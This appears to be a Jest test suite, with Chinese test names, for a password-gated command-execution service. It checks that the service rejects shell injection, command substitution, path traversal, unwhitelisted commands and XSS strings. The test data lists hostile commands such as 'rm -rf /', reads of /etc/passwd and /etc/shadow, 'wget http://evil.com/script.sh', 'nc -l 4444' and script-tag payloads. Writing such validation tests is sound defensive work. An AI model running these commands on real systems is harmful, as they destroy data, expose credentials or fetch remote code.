import { commandService } from '../services/commandService';

describe('CommandService 安全性测试', () => {
  beforeEach(() => {
    // 清理命令队列
    const commands = commandService.getNextCommand();
    if (commands.command) {
      commandService.removeCommand(commands.command);
    }
  });

  describe('命令注入防护', () => {
    it('应该使用spawn而非exec执行命令', () => {
      // 这个测试验证我们使用的是spawn而不是exec
      const result = commandService.addCommand('ls', 'wumy');
      expect(result.status).toBe('command added');
      
      // 验证命令可以被安全执行
      expect(async () => {
        await commandService.executeCommand('ls');
      }).not.toThrow();
    });

    it('应该拒绝shell注入攻击', () => {
      const shellInjectionAttempts = [
        'ls; rm -rf /',
        'pwd && cat /etc/passwd',
        'whoami | wc -l',
        'date `whoami`',
        'uptime $(cat /etc/passwd)',
        'free; echo "malicious"',
        'df & echo "attack"',
        'ps | grep root',
        'top `id`',
        'systemctl; rm -rf /',
        'service; cat /etc/shadow',
        'docker; echo "hack"',
        'git; rm -rf .',
        'npm; echo "evil"',
        'node; process.exit(1)',
        'ls && rm -rf /',
        'pwd || cat /etc/passwd',
        'whoami > /tmp/hack',
        'date >> /tmp/hack',
        'uptime 2>&1'
      ];

      shellInjectionAttempts.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        expect(result.status).toBe('error');
        expect(result.message).toContain('命令包含危险字符');
      });
    });

    it('应该拒绝参数注入攻击', () => {
      const parameterInjectionAttempts = [
        'ls --help; rm -rf /',
        'pwd --version && cat /etc/passwd',
        'whoami --help | wc -l',
        'date --help `whoami`',
        'uptime --help $(cat /etc/passwd)',
        'free --help; echo "malicious"',
        'df --help & echo "attack"',
        'ps --help | grep root',
        'top --help `id`',
        'systemctl --help; rm -rf /',
        'service --help; cat /etc/shadow',
        'docker --help; echo "hack"',
        'git --help; rm -rf .',
        'npm --help; echo "evil"',
        'node --help; process.exit(1)',
        'ls --help && rm -rf /',
        'pwd --version || cat /etc/passwd',
        'whoami --help > /tmp/hack',
        'date --help >> /tmp/hack',
        'uptime --help 2>&1'
      ];

      parameterInjectionAttempts.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        expect(result.status).toBe('error');
        expect(result.message).toContain('参数包含危险字符');
      });
    });

    it('应该拒绝命令替换攻击', () => {
      const commandSubstitutionAttempts = [
        'ls $(rm -rf /)',
        'pwd `cat /etc/passwd`',
        'whoami $(echo "malicious")',
        'date `echo "attack"`',
        'uptime $(whoami)',
        'free `id`',
        'df $(uname -a)',
        'ps `ps aux`',
        'top $(top -n 1)',
        'systemctl $(systemctl status)',
        'service `service --status-all`',
        'docker $(docker ps)',
        'git `git status`',
        'npm $(npm list)',
        'node `node --version`'
      ];

      commandSubstitutionAttempts.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        expect(result.status).toBe('error');
        expect(result.message).toContain('命令包含危险字符');
      });
    });

    it('应该拒绝路径遍历攻击', () => {
      const pathTraversalAttempts = [
        'ls ../../../etc/passwd',
        'pwd ../../../../root',
        'whoami /etc/../etc/passwd',
        'date /tmp/../etc/shadow',
        'uptime /var/../etc/passwd',
        'free /home/../etc/shadow',
        'df /usr/../etc/passwd',
        'ps /bin/../etc/shadow',
        'top /sbin/../etc/passwd',
        'systemctl /lib/../etc/shadow',
        'service /opt/../etc/passwd',
        'docker /mnt/../etc/shadow',
        'git /media/../etc/passwd',
        'npm /dev/../etc/shadow',
        'node /proc/../etc/passwd'
      ];

      pathTraversalAttempts.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        expect(result.status).toBe('error');
        expect(result.message).toContain('参数包含危险字符');
      });
    });
  });

  describe('命令白名单验证', () => {
    it('应该拒绝未授权的命令', () => {
      const unauthorizedCommands = [
        'rm -rf /',
        'cat /etc/passwd',
        'wget http://evil.com/script.sh',
        'curl http://malicious.com',
        'nc -l 4444',
        'bash -c "echo evil"',
        'sh -c "rm -rf /"',
        'python -c "import os; os.system(\'rm -rf /\')"',
        'perl -e "system(\'rm -rf /\')"',
        'ruby -e "system(\'rm -rf /\')"',
        'echo "malicious"',
        'touch /tmp/hack',
        'mkdir /tmp/hack',
        'cp /etc/passwd /tmp/hack',
        'mv /etc/passwd /tmp/hack',
        'ln -s /etc/passwd /tmp/hack',
        'chmod 777 /tmp/hack',
        'chown root /tmp/hack',
        'kill -9 1',
        'reboot'
      ];

      unauthorizedCommands.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        expect(result.status).toBe('error');
        expect(result.message).toContain('不允许执行命令');
      });
    });

    it('应该接受授权的命令', () => {
      const authorizedCommands = [
        'ls',
        'pwd',
        'whoami',
        'date',
        'uptime',
        'free',
        'df',
        'ps',
        'top',
        'systemctl status',
        'service --status-all',
        'docker ps',
        'git status',
        'npm list',
        'node --version'
      ];

      authorizedCommands.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        expect(result.status).toBe('command added');
        expect(result.command).toBe(command);
      });
    });
  });

  describe('输入验证', () => {
    it('应该拒绝空命令', () => {
      const result = commandService.addCommand('', 'wumy');
      expect(result.status).toBe('error');
      expect(result.message).toContain('命令不能为空');
    });

    it('应该拒绝非字符串输入', () => {
      // @ts-ignore - 故意传递错误类型进行测试
      const result = commandService.addCommand(null, 'wumy');
      expect(result.status).toBe('error');
      expect(result.message).toContain('命令不能为空');
    });

    it('应该拒绝过长的命令', () => {
      const longCommand = 'ls ' + 'a'.repeat(200);
      const result = commandService.addCommand(longCommand, 'wumy');
      expect(result.status).toBe('error');
      expect(result.message).toContain('命令长度超过限制');
    });

    it('应该拒绝包含特殊字符的命令', () => {
      const specialCharCommands = [
        'ls<script>alert("xss")</script>',
        'pwd<img src=x onerror=alert("xss")>',
        'whoami<iframe src="javascript:alert(\'xss\')"></iframe>',
        'date<svg onload="alert(\'xss\')"></svg>',
        'uptime<object data="javascript:alert(\'xss\')"></object>'
      ];

      specialCharCommands.forEach(command => {
        const result = commandService.addCommand(command, 'wumy');
        expect(result.status).toBe('error');
        expect(result.message).toContain('命令包含危险字符');
      });
    });
  });

  describe('执行安全性', () => {
    it('应该正确处理命令执行错误', async () => {
      // 测试不存在的命令
      await expect(commandService.executeCommand('nonexistentcommand')).rejects.toThrow();
    });

    it('应该正确处理命令超时', async () => {
      // 这个测试可能需要根据实际环境调整
      const result = commandService.addCommand('sleep 35', 'wumy');
      if (result.status === 'command added') {
        await expect(commandService.executeCommand('sleep 35')).rejects.toThrow('timeout');
      }
    });

    it('应该正确处理命令退出码', async () => {
      // 测试返回非零退出码的命令
      const result = commandService.addCommand('ls /nonexistent', 'wumy');
      if (result.status === 'command added') {
        await expect(commandService.executeCommand('ls /nonexistent')).rejects.toThrow();
      }
    });
  });

  describe('密码验证', () => {
    it('应该拒绝错误的密码', () => {
      const result = commandService.addCommand('ls', 'wrongpassword');
      expect(result.status).toBe('error');
      expect(result.message).toBe('Invalid password');
    });

    it('应该接受正确的密码', () => {
      const result = commandService.addCommand('ls', 'wumy');
      expect(result.status).toBe('command added');
    });
  });
}); 